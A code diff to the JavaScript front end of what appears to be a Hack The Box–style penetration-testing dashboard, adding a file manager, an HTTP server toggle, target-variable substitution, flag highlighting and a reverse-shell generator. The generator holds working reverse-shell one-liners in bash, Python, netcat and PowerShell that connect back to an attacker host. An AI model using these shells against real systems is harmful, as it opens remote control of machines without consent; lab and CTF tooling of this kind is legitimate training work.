@@ -128,6 +128,13 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     // --- Helpers ---
+    function getVars() {
+        return {
+            RHOST: document.getElementById('var-rhost').value || '127.0.0.1',
+            LHOST: document.getElementById('var-lhost').value || '127.0.0.1'
+        };
+    }
+
     function checkVpnStatus() {
         fetch('/api/tools/vpn/status')
             .then(r => r.json())
@@ -151,18 +158,87 @@ document.addEventListener('DOMContentLoaded', () => {
         if (statusData.running) {
             btn.classList.remove('btn-outline-warning');
             btn.classList.add('btn-warning');
-            btn.innerText = 'Stop WebDAV';
+            btn.innerText = 'Stop';
             portInput.value = statusData.port;
             portInput.disabled = true;
-            statusDiv.innerHTML = `Running on port ${statusData.port}<br><span class="text-truncate d-block" title="${statusData.path}">Path: ...${statusData.path.slice(-15)}</span>`;
+            statusDiv.innerHTML = `Running: ${statusData.port}`;
         } else {
             btn.classList.add('btn-outline-warning');
             btn.classList.remove('btn-warning');
-            btn.innerText = 'Start WebDAV';
+            btn.innerText = 'Start';
             portInput.disabled = false;
-            statusDiv.innerText = 'Status: Stopped';
+            statusDiv.innerText = 'Stopped';
         }
     }
+
+    function updateHttpUI(statusData) {
+        const btn = document.getElementById('btn-http-toggle');
+        const statusDiv = document.getElementById('http-status');
+        const portInput = document.getElementById('http-port');
+
+        if (statusData.running) {
+            btn.classList.remove('btn-outline-warning');
+            btn.classList.add('btn-warning');
+            btn.innerText = 'Stop';
+            portInput.value = statusData.port;
+            portInput.disabled = true;
+            statusDiv.innerHTML = `Running: ${statusData.port}`;
+        } else {
+            btn.classList.add('btn-outline-warning');
+            btn.classList.remove('btn-warning');
+            btn.innerText = 'Start';
+            portInput.disabled = false;
+            statusDiv.innerText = 'Stopped';
+        }
+    }
+
+    // --- File Manager ---
+    function loadFiles() {
+        fetch('/api/files')
+        .then(r => r.json())
+        .then(files => {
+            const tbody = document.getElementById('file-list-body');
+            tbody.innerHTML = '';
+            files.forEach(f => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td class="text-truncate" style="max-width: 150px;" title="${f.name}">${f.name}</td>
+                    <td>${(f.size / 1024).toFixed(1)} KB</td>
+                    <td class="text-end">
+                        <button class="btn btn-sm btn-outline-danger py-0" style="font-size: 0.65rem;" onclick="deleteFile('${f.name}')">Del</button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        });
+    }
+
+    window.deleteFile = function(filename) {
+        if(confirm(`Delete ${filename}?`)) {
+            fetch(`/api/files/${filename}`, { method: 'DELETE' })
+            .then(() => loadFiles());
+        }
+    };
+
+    document.getElementById('btn-refresh-files').addEventListener('click', loadFiles);
+
+    document.getElementById('btn-upload-file').addEventListener('click', () => {
+        const input = document.getElementById('file-upload-input');
+        if(input.files.length > 0) {
+            const formData = new FormData();
+            formData.append('file', input.files[0]);
+            fetch('/api/files', { method: 'POST', body: formData })
+            .then(r => r.json())
+            .then(() => {
+                loadFiles();
+                input.value = '';
+            });
+        }
+    });
+
+    // Auto-refresh files when tab is shown
+    document.getElementById('tab-btn-files').addEventListener('shown.bs.tab', loadFiles);
+
 
     // --- Terminals ---
 
@@ -379,6 +455,10 @@ document.addEventListener('DOMContentLoaded', () => {
             .then(r => r.json())
             .then(data => updateWebDAVUI(data));
 
+        fetch('/api/tools/http/status')
+            .then(r => r.json())
+            .then(data => updateHttpUI(data));
+
         fetch('/api/tools/vpn/list')
             .then(r => r.json())
             .then(data => {
@@ -399,7 +479,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     socket.on('output', data => {
         if (data.term_id && terminals[data.term_id]) {
-            terminals[data.term_id].term.write(data.output);
+            let out = data.output;
+            // Simple Highlighting using ANSI codes
+            // Note: This is fragile if output is split across packets, but good enough for MVP
+
+            // Highlight HTB{...} in Magenta
+            out = out.replace(/(HTB\{.*?\})/g, '\x1b[35m$1\x1b[0m');
+
+            // Highlight IP addresses in Cyan
+            // out = out.replace(/(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/g, '\x1b[36m$1\x1b[0m');
+
+            terminals[data.term_id].term.write(out);
         }
     });
 
@@ -441,6 +531,18 @@ document.addEventListener('DOMContentLoaded', () => {
         .then(data => updateWebDAVUI(data.details));
     });
 
+    // HTTP Server
+    document.getElementById('btn-http-toggle').addEventListener('click', () => {
+        const port = document.getElementById('http-port').value;
+        fetch('/api/tools/http/toggle', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({port: port})
+        })
+        .then(r => r.json())
+        .then(data => updateHttpUI(data.details));
+    });
+
     // VPN
     document.getElementById('btn-vpn-connect').addEventListener('click', () => {
         const config = document.getElementById('vpn-config-select').value;
@@ -454,7 +556,10 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Nmap
     document.getElementById('btn-nmap-run').addEventListener('click', () => {
-        const cmd = document.getElementById('nmap-command').value;
+        let cmd = document.getElementById('nmap-command').value;
+        const vars = getVars();
+        cmd = cmd.replace(/{RHOST}/g, vars.RHOST).replace(/{LHOST}/g, vars.LHOST);
+
         if(cmd && activeTermId && terminals[activeTermId]) {
              terminals[activeTermId].term.write(`\r\n\x1b[32m[System] Running: ${cmd}\x1b[0m\r\n`);
              // Pipe to tee for saving with unique ID based on terminal
@@ -533,6 +638,64 @@ document.addEventListener('DOMContentLoaded', () => {
             const cmd = `ssh ${target}`;
             createTerminal(null, cmd);
         }
+    });
+
+    // Snippets
+    document.querySelectorAll('.snippet-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            let cmd = btn.dataset.cmd;
+            const vars = getVars();
+            cmd = cmd.replace(/{RHOST}/g, vars.RHOST).replace(/{LHOST}/g, vars.LHOST);
+
+            if(activeTermId && terminals[activeTermId]) {
+                socket.emit('input', { term_id: activeTermId, input: cmd + "\n" });
+            } else {
+                alert('No active terminal');
+            }
+        });
+    });
+
+    // RevShell Generator
+    function updateRevShell() {
+        const type = document.getElementById('revshell-type').value;
+        const vars = getVars();
+        const port = 4444; // Default or could use input
+        let shell = '';
+
+        switch(type) {
+            case 'bash':
+                shell = `bash -i >& /dev/tcp/${vars.LHOST}/${port} 0>&1`;
+                break;
+            case 'python':
+                shell = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${vars.LHOST}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
+                break;
+            case 'nc':
+                shell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${vars.LHOST} ${port} >/tmp/f`;
+                break;
+            case 'powershell':
+                shell = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${vars.LHOST}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+                break;
+        }
+        document.getElementById('revshell-output').value = shell;
+    }
+
+    document.getElementById('revshell-type').addEventListener('change', updateRevShell);
+    ['var-rhost', 'var-lhost'].forEach(id => {
+        document.getElementById(id).addEventListener('input', updateRevShell);
+    });
+
+    // Initialize
+    updateRevShell();
+
+    document.getElementById('btn-copy-revshell').addEventListener('click', () => {
+        const text = document.getElementById('revshell-output').value;
+        navigator.clipboard.writeText(text);
+
+        // Also auto-type if desired? No, better just copy.
+        const btn = document.getElementById('btn-copy-revshell');
+        const orig = btn.innerText;
+        btn.innerText = 'Copied!';
+        setTimeout(() => btn.innerText = orig, 1500);
     });
 
     // --- Split.js Initialization ---
